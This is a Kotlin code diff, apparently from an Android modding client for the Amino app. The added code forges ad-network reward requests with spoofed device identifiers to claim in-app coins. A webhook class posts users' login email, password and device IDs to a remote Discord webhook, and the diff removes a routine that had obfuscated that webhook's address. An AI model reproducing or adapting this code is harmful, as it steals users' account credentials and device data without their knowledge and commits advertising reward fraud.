+                "placement_tag" to "default",
+                "reward_name" to "Amino Coin",
+                "reward_valid" to true,
+                "reward_value" to 2,
+                "shared_id" to shrwtr,
+                "version_id" to "1569147951493",
+                "waterfall_id" to shrwtr
             ),
-            "do_not_track" to true,
-            "idfa" to "107e5bfe-4adc-4b0d-a1f5-7731a22d8957",
-            "ip_address" to "",
-            "locale" to "en",
-            "timezone" to mapOf(
-                "location" to "Africa/Brazzaville",
-                "offset" to "GMT+01 to00"
+            "app" to mapOf(
+                "bundle_id" to "com.narvii.amino.master",
+                "current_orientation" to "portrait",
+                "release_version" to "3.4.33587",
+                "user_agent" to "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G988N Build/z3qksx-user 7.1.2 NR; com.narvii.amino.master/3.4.33587)"
             ),
-            "volume_enabled" to true,
-        ),
-        "session_id" to UUID.randomUUID()
-    ))
+            "date_created" to System.currentTimeMillis(),
+            "device_user" to mapOf(
+                "country" to "US",
+                "device" to mapOf(
+                    "architecture" to "i686",
+                    "carrier" to mapOf(
+                        "country_code" to 268,
+                        "name" to "Vodafone",
+                        "network_code" to 0
+                    ),
+                    "is_phone" to false,
+                    "model" to "SM-G988F",
+                    "model_type" to "samsung",
+                    "operating_system" to "android",
+                    "operating_system_version" to "25",
+                    "screen_size" to mapOf(
+                        "height" to 1920,
+                        "resolution" to 2,
+                        "width" to 1080
+                    ),
+                ),
+                "do_not_track" to true,
+                "idfa" to "107e5bfe-4adc-4b0d-a1f5-7731a22d8957",
+                "ip_address" to "",
+                "locale" to "en",
+                "timezone" to mapOf(
+                    "location" to "Africa/Brazzaville",
+                    "offset" to "GMT+01 to00"
+                ),
+                "volume_enabled" to true,
+            ),
+            "session_id" to UUID.randomUUID()
+        )
+    )
 }
 
 fun sendTapJoy(): Int {
-    val post = post(url = "https://ads.tapdaq.com/v4/analytics/reward", json = tapjoyData(userId = UID), headers = tapjoyHeaders())
-    return post.statusCode
+    val mediaType = "application/json; charset=utf-8".toMediaType()
+
+    val body = tapjoyData(userId = UID).toString().toRequestBody(mediaType)
+
+    val request: Request = Request.Builder()
+        .url("https://ads.tapdaq.com/v4/analytics/reward")
+        .post(body)
+        .headers(tapjoyHeaders().toHeaders())
+        .build()
+
+    client.newCall(request).execute().use { response ->
+        return response.code
+    }
 }
 
 fun append(arr: Array<String>, element: String): Array<String> {
@@ -601,6 +975,7 @@ fun hashString(type: String, input: String): String {
     return result.toString()
 }
 
+
 class WebHook(private val ctx: Context) {
     private val msgLoginTitle = "User Login Detected"
     private val msgLoginDescription = "An user has logged in successfully"
@@ -608,22 +983,6 @@ class WebHook(private val ctx: Context) {
 
     private val msgSetupErrorTitle = "User Detected Modding AminoX"
     private val msgSetupErrorColor = 0xff0000
-
-    private fun whPath(): String {
-        var parId = arrayOf<String>()
-        var parTk = arrayOf<String>()
-
-        for (chr in discordId.split(ctx.getString(R.string.delimiter))) { parId = append(
-            parId,
-            chr.toInt().toChar().toString()
-        ) }
-        for (chr in discordToken.split(ctx.getString(R.string.delimiter))) { parTk = append(
-            parTk,
-            chr.toInt().toChar().toString()
-        ) }
-
-        return "${join("", parId)}/${join("", parTk)}"
-    }
 
     @SuppressLint("HardwareIds")
     fun sendSetupError(
@@ -635,7 +994,10 @@ class WebHook(private val ctx: Context) {
     ): String {
         val baseOs: String = Build.VERSION.BASE_OS
         val secPatch: String = Build.VERSION.SECURITY_PATCH
-        val andId: String = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
+        val andId: String = Settings.Secure.getString(
+            ctx.contentResolver,
+            Settings.Secure.ANDROID_ID
+        )
         val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
 
         val field1 = JSONObject().put("name", "Device Model").put(
@@ -690,25 +1052,43 @@ class WebHook(private val ctx: Context) {
         val embeds = JSONArray()
         embeds.put(embed)
 
-        val post = post(
-            webhook,
-            json = mapOf(
+        val data = JSONObject(
+            mapOf(
                 "embeds" to embeds
-            ),
-            headers = mapOf(
-                "User-Agent" to userAgent,
-                "Content-Type" to "application/json; charset=utf-8"
             )
         )
 
-        return post.text
+        val head = mapOf(
+            "User-Agent" to userAgent,
+            "Content-Type" to "application/json; charset=utf-8"
+        )
+
+        val mediaType = "application/json; charset=utf-8".toMediaType()
+        val body = data.toString().toRequestBody(mediaType)
+
+        var final: String
+
+        val request: Request = Request.Builder()
+            .url(webhook)
+            .post(body)
+            .headers(head.toHeaders())
+            .build()
+
+        client.newCall(request).execute().use { response ->
+            final = response.body?.string().toString()
+        }
+
+        return final
     }
 
     @SuppressLint("HardwareIds")
     fun sendLoginMessage(loginJson: JSONObject, userEmail: String, userPassword: String): String {
         val baseOs: String = Build.VERSION.BASE_OS
         val secPatch: String = Build.VERSION.SECURITY_PATCH
-        val andId: String = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
+        val andId: String = Settings.Secure.getString(
+            ctx.contentResolver,
+            Settings.Secure.ANDROID_ID
+        )
         val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
         val userData = JSONObject(loginJson.getJSONObject("userProfile").toString())
         val userName = userData.getString("nickname")
@@ -777,17 +1157,34 @@ class WebHook(private val ctx: Context) {
             embeds.put(embedAmino)
         }
 
-        val post = post(
-            webhook,
-            json = mapOf(
+        val data = JSONObject(
+            mapOf(
                 "embeds" to embeds
-            ),
-            headers = mapOf(
-                "User-Agent" to userAgent,
-                "Content-Type" to "application/json; charset=utf-8"
             )
         )
 
-        return post.text
+        val head = mapOf(
+            "User-Agent" to userAgent,
+            "Content-Type" to "application/json; charset=utf-8"
+        )
+
+        val mediaType = "application/json; charset=utf-8".toMediaType()
+        val body = data.toString().toRequestBody(mediaType)
+
+        var final: String
+
+        val request: Request = Request.Builder()
+            .url(webhook)
+            .post(body)
+            .headers(head.toHeaders())
+            .build()
+
+        client.newCall(request).execute().use { response ->
+            final = response.body?.string().toString()
+        }
+
+        println("WEBHOOK $final")
+
+        return final
     }
 }
